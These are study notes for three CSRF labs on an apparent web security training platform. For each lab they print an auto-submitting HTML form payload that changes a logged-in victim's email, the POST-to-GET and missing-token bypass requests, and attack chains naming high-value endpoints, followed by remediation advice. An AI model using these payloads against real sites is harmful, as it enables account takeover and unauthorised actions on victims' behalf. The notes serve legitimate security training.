# 🐞 Lab-1 — CSRF → Change Email (No CSRF Token)

---

## 🧠 🔥 Overview (Full Theory + Insight)

This lab demonstrates a critical **CSRF (Cross-Site Request Forgery)** vulnerability where an attacker forces a logged-in user to change their email without consent.

---

Normally, secure applications include anti-CSRF protections like tokens.

---

However, in this lab:

The application relies **only on cookies for authentication** and does NOT validate request origin.

---

👉 This allows an attacker to forge a request that the server fully trusts.

---

## 🧠 🟦 Core Idea

If a request depends only on cookies → it can be forged from another site

---

## 🧠 🟥 Key Exploit

```
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>
```

---

👉 Forces victim browser to send authenticated request

---

## 🔍 🧠 What Is This Topic?

### 🔹 CSRF (Cross-Site Request Forgery)

Tricking a user’s browser into sending a request that performs an action on their behalf

---

## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)

---

### 🧩 Step 1 — Login

```
Username: wiener
Password: peter
```

---

### 🧩 Step 2 — Perform Action Normally

Go to:

```
My Account → Change Email
```

---

Submit any email

---

### 🧩 Step 3 — Capture Request

```
POST /my-account/change-email

email=test@abc.com
Cookie: session=xyz
```

---

![change-email-request](../images/change-email-request.png)

---

### 🧠 Key Observation

```
No CSRF token present
Only cookie used for authentication
Email parameter is predictable
```

---

👉 Vulnerability confirmed

---

### 🧩 Step 4 — Analyze Behavior

```
Cookie is automatically sent by browser
Server trusts request without validation
```

---

👉 No origin verification

---

### 🧩 Step 5 — Create CSRF Payload

```
<html>
<body>

<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>

</body>
</html>
```

---

### 🧩 Step 6 — Deliver Exploit

```
Host payload on attacker-controlled page
```

---

### 🧩 Step 7 — Victim Loads Page

```
Browser auto-submits request
Cookie automatically attached
```

---

👉 Email gets changed

---

## 💣 🟨 Payload Breakdown (Easy)

---

### 🔹 Form

```
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
```

---

Targets vulnerable endpoint

---

### 🔹 Hidden Input

```
<input type="hidden" name="email" value="attacker@evil.com">
```

---

Injects attacker-controlled data

---

### 🔹 Auto Submit Script

```
<script>
document.forms[0].submit();
</script>
```

---

Executes request without user interaction

---

## 🌍 🟥 Real-World Scenarios

---

### 🔥 Scenario 1 — Change Email

```
Attacker changes victim email
→ Password reset
→ Account takeover
```

---

### 🔥 Scenario 2 — Change Password

```
If no old password required
→ Direct takeover
```

---

### 🔥 Scenario 3 — Add Payment Method

```
Victim adds attacker-controlled card
```

---

### 🔥 Scenario 4 — Transfer Funds

```
Banking actions executed silently
```

---

### 🔥 Scenario 5 — Delete Data

```
Permanent loss of user data
```

---

## ⚔️ 🧠 Attack Chain

---

1️⃣ Identify sensitive endpoint  
2️⃣ Check for CSRF token  
3️⃣ Confirm cookie-based auth  
4️⃣ Create malicious form  
5️⃣ Auto-submit request  
6️⃣ Victim visits attacker page  
7️⃣ Action executed as victim  

---

## 🎯 High-Value Endpoints

---

### 🔹 Account Actions

```
/my-account/change-email
/my-account/change-password
```

---

### 🔹 Financial Actions

```
/transfer
/add-payment-method
```

---

### 🔹 APIs

```
/api/update-profile
```

---

### 🔹 Admin Actions

```
/admin/delete-user
```

---

## ⚠️ 🟥 Real-World Limitations + Bypass

---

### ❌ CSRF Token Present

👉 Attack fails

---

### ❌ SameSite Cookies

👉 Cookies not sent

---

### ❌ Origin / Referer Check

👉 Request blocked

---

### ❌ Custom Headers Required

👉 Cannot send via HTML

---

### ✅ Bypass Ideas

```
Find unprotected endpoints
Exploit weak token validation
Use GET-based CSRF
Combine with XSS
```

---

## 🛡️ 🔒 Remediation

---

### 🔴 Root Problem

Authentication relies only on cookies

---

### ✅ Fix 1 — Implement CSRF Tokens

```
Add unique token per request
```

---

### ✅ Fix 2 — Validate Server-Side

```
Reject missing or invalid tokens
```

---

### ✅ Fix 3 — Use SameSite Cookies

```
SameSite=Strict or Lax
```

---

### ✅ Fix 4 — Check Origin / Referer

```
Allow only same-site requests
```

---

### ✅ Fix 5 — Re-authentication

```
Require password for sensitive actions
```

---

### ✅ Fix 6 — Use Custom Headers

```
Only same-origin JS can send them
```

---

## 🧠 🟪 Mental Model

---

CSRF = abusing trust in browser  

Cookies = automatic authentication  

No token = no protection  

---

Attacker cannot read response  
But can force actions  

---

## 🎯 🧠 Final Summary

---

✔ Works when:
- User is logged in  
- Only cookies used  
- No CSRF token  

---

✔ Attack method:

```
Create form → auto-submit → victim loads → request sent
```

---

✔ Result:

Action executed as victim  

---

## 🔥 Final One-Liner

---

CSRF = forcing trusted actions through the victim’s browser

---

# 🐞 Lab-2 — CSRF → POST to GET Bypass (Email Change)

---

## 🧠 🔥 Overview (Full Theory + Insight)

This lab demonstrates a **CSRF bypass** where protection exists but is improperly enforced.

---

Normally:

CSRF tokens protect sensitive actions.

---

However, in this lab:

The server validates CSRF **only for POST requests** and ignores it for GET.

---

👉 This creates a bypass where attacker can switch method and remove token.

---

## 🧠 🟦 Core Idea

If CSRF is enforced only on POST → switching to GET bypasses protection

---

## 🧠 🟥 Key Exploit

```
GET /my-account/change-email?email=attacker@evil.com
```

---

👉 No CSRF token required → request succeeds

---

## 🔍 🧠 What Is This Topic?

### 🔹 CSRF Method Bypass

A flaw where CSRF validation depends on HTTP method instead of enforcing protection universally

---

## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)

---

### 🧩 Step 1 — Capture POST Request

```
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=test@x.com&csrf=RANDOM_TOKEN
```

---

![post-with-csrf](../images/post-with-csrf.png)

---

### 🧠 Observation

```
CSRF token is present
```

---

### 🧩 Step 2 — Test CSRF Validation

Modify token:

```
email=test@x.com&csrf=INVALID
```

---

👉 Result:

```
Invalid CSRF token
```

---

![invalid-csrf](../images/invalid-csrf.png)

---

### 🧠 Conclusion

```
CSRF protection exists (for POST)
```

---

### 🧩 Step 3 — Change POST → GET

```
GET /my-account/change-email?email=test@x.com&csrf=RANDOM_TOKEN
```

---

Remove request body completely

---

### 🧩 Step 4 — Observe Behavior

```
GET /my-account/change-email?email=test@x.com
```

---

👉 Result:

✔ Request succeeds  
✔ CSRF token ignored  

---

![get-bypass](../images/get-bypass.png)

---

### 🧠 Vulnerability Confirmed

```
CSRF validation is bypassed via GET method
```

---

### 🧩 Step 5 — Build CSRF Exploit

```
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
document.forms[0].submit();
</script>
```

---

### 🧩 Step 6 — Deliver Exploit

```
Host on exploit server
Victim loads page
```

---

👉 Browser sends GET request automatically

---

### 🧩 Step 7 — Result

```
Email changed without CSRF validation
```

---

## 💣 🟨 Payload Breakdown (Easy)

---

### 🔹 GET Request

```
/my-account/change-email?email=attacker@evil.com
```

---

### 🔹 Form

```
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
```

---

### 🔹 Hidden Input

```
<input type="hidden" name="email" value="attacker@evil.com">
```

---

### 🔹 Auto Submit

```
<script>
document.forms[0].submit();
</script>
```

---

## 🌍 🟥 Real-World Scenarios

---

### 🔥 Scenario 1 — Banking Apps

```
POST protected
GET unprotected → money transfer
```

---

### 🔥 Scenario 2 — Account Takeover

```
Change email via GET
→ reset password
```

---

### 🔥 Scenario 3 — Admin Panels

```
POST protected
GET adds admin user
```

---

### 🔥 Scenario 4 — API Misconfig

```
Same endpoint supports GET + POST
Only POST validated
```

---

## ⚔️ 🧠 Attack Chain

---

1️⃣ Capture request  
2️⃣ Identify CSRF token  
3️⃣ Test invalid token  
4️⃣ Switch POST → GET  
5️⃣ Remove CSRF token  
6️⃣ Confirm bypass  
7️⃣ Build exploit page  
8️⃣ Deliver to victim  
9️⃣ Action executed  

---

## 🎯 High-Value Endpoints

---

### 🔹 Account Actions

```
/my-account/change-email
/change-password
```

---

### 🔹 Financial

```
/transfer-money
```

---

### 🔹 Admin

```
/add-admin
```

---

### 🔹 APIs

```
/api/update-profile
```

---

## ⚠️ 🟥 Real-World Limitations + Bypass

---

### ❌ GET Not Supported

👉 No bypass possible

---

### ❌ CSRF Validated on All Methods

👉 Attack fails

---

### ❌ SameSite Cookies

👉 Cookies blocked

---

### ❌ Origin / Referer Check

👉 Request rejected

---

### ✅ Bypass Ideas

```
Try alternate HTTP methods
Check hidden GET endpoints
Look for inconsistent validation
```

---

## 🛡️ 🔒 Remediation

---

### 🔴 Root Problem

CSRF validation applied only to POST

---

### ✅ Fix 1 — Enforce CSRF on ALL Methods

```
Validate token for GET + POST + others
```

---

### ✅ Fix 2 — Disallow State Change via GET

```
GET should be read-only
```

---

### ✅ Fix 3 — Validate Origin / Referer

```
Reject cross-site requests
```

---

### ✅ Fix 4 — Use SameSite Cookies

```
SameSite=Strict
```

---

### ✅ Fix 5 — Re-authentication

```
Require password for sensitive changes
```

---

## 🧠 🟪 Mental Model

---

POST = protected  

GET = often forgotten  

---

If one method is weak → entire protection fails  

---

## 🎯 🧠 Final Summary

---

✔ CSRF token exists but is incomplete  

✔ Switching method bypasses protection  

✔ GET request executes without validation  

---

## 🔥 Final One-Liner

---

CSRF protection on POST only = instant bypass via GET

---

# 🐞 Lab-3 — CSRF → Missing Token Validation (Email Change)

---

## 🧠 🔥 Overview (Full Theory + Insight)

This lab demonstrates a flawed CSRF implementation where the server partially validates tokens.

---

Normally:

A CSRF token must be **present AND valid**.

---

However, in this lab:

The server validates the token **only if it exists**, but does NOT require it.

---

👉 This allows attackers to bypass protection by removing the token entirely.

---

## 🧠 🟦 Core Idea

If CSRF token is optional → protection is broken

---

## 🧠 🟥 Key Exploit

```
POST /my-account/change-email

email=attacker@evil.com
```

---

👉 No CSRF token → request still succeeds

---

## 🔍 🧠 What Is This Topic?

### 🔹 Missing CSRF Token Validation

A vulnerability where server checks token validity but fails to enforce its presence

---

## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)

---

### 🧩 Step 1 — Capture Request

```
POST /my-account/change-email
Content-Type: application/x-www-form-urlencoded

email=test@abc.com&csrf=RANDOM_TOKEN
```

---

### 🧩 Step 2 — Test Token Validation

Modify token:

```
email=test@abc.com&csrf=INVALID
```

---

👉 Result:

```
Invalid CSRF token
```

---

### 🧧 Step 3 — Remove CSRF Token Completely

```
POST /my-account/change-email

email=test@abc.com
```

---

👉 Result:

✔ Request accepted  
✔ Email successfully changed  

---

![csrf-missing-token](../images/csrf-missing-token.png)

---

### 🧠 Vulnerability Confirmed

```
Server does NOT enforce presence of CSRF token
```

---

### 🧩 Step 4 — Build CSRF Exploit

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.net">
</form>

<script>
document.forms[0].submit();
</script>
```

---

### 🧩 Step 5 — Deliver Exploit

```
Host payload on exploit server
Victim loads page
```

---

👉 Browser sends authenticated request automatically

---

### 🧩 Step 6 — Result

```
Email changed without CSRF token
```

---

## 💣 🟨 Payload Breakdown (Easy)

---

### 🔹 Request

```
POST /my-account/change-email

email=attacker@evil.net
```

---

### 🔹 Form

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
```

---

### 🔹 Hidden Input

```
<input type="hidden" name="email" value="attacker@evil.net">
```

---

### 🔹 Auto Submit

```
<script>
document.forms[0].submit();
</script>
```

---

## 🌍 🟥 Real-World Scenarios

---

### 🔥 Scenario 1 — Account Takeover

```
Change email → reset password → full control
```

---

### 🔥 Scenario 2 — Banking Actions

```
Transfer funds without CSRF validation
```

---

### 🔥 Scenario 3 — Admin Privilege Abuse

```
Add attacker as admin
```

---

### 🔥 Scenario 4 — Broken Security Logic

```
Developer validates token but forgets to enforce presence
```

---

## ⚔️ 🧠 Attack Chain

---

1️⃣ Capture request  
2️⃣ Modify CSRF token → rejected  
3️⃣ Remove CSRF token → accepted  
4️⃣ Confirm vulnerability  
5️⃣ Build exploit page  
6️⃣ Host payload  
7️⃣ Victim loads page  
8️⃣ Browser sends request  
9️⃣ Action executed  

---

## 🎯 High-Value Endpoints

---

### 🔹 Account

```
/change-email
/change-password
```

---

### 🔹 Financial

```
/transfer-money
```

---

### 🔹 Admin

```
/add-admin
```

---

### 🔹 Profile

```
/update-profile
```

---

## ⚠️ 🟥 Real-World Limitations + Bypass

---

### ❌ Strict Token Enforcement

👉 Attack fails

---

### ❌ SameSite Cookies

👉 Cookies blocked

---

### ❌ Origin / Referer Check

👉 Request rejected

---

### ❌ Custom Headers Required

👉 Cannot be forged via HTML

---

### ✅ Bypass Ideas

```
Find endpoints with missing token enforcement
Check APIs separately
Test optional parameters
```

---

## 🛡️ 🔒 Remediation

---

### 🔴 Root Problem

Token validation exists but token is not required

---

### ✅ Fix 1 — Require CSRF Token

```
Reject request if token is missing
```

---

### ✅ Fix 2 — Strict Validation

```
Token must match session
```

---

### ✅ Fix 3 — SameSite Cookies

```
SameSite=Strict
```

---

### ✅ Fix 4 — Validate Origin / Referer

```
Allow only same-site requests
```

---

### ✅ Fix 5 — Use Security Frameworks

```
Implement proper CSRF middleware
```

---

## 🧠 🟪 Mental Model

---

Invalid token = blocked  

Missing token = allowed ❌  

---

This = broken protection  

---

## 🎯 🧠 Final Summary

---

✔ Token validation exists but incomplete  

✔ Removing token bypasses protection  

✔ Server trusts request without verification  

---

## 🔥 Final One-Liner

---

Optional CSRF token = no CSRF protection
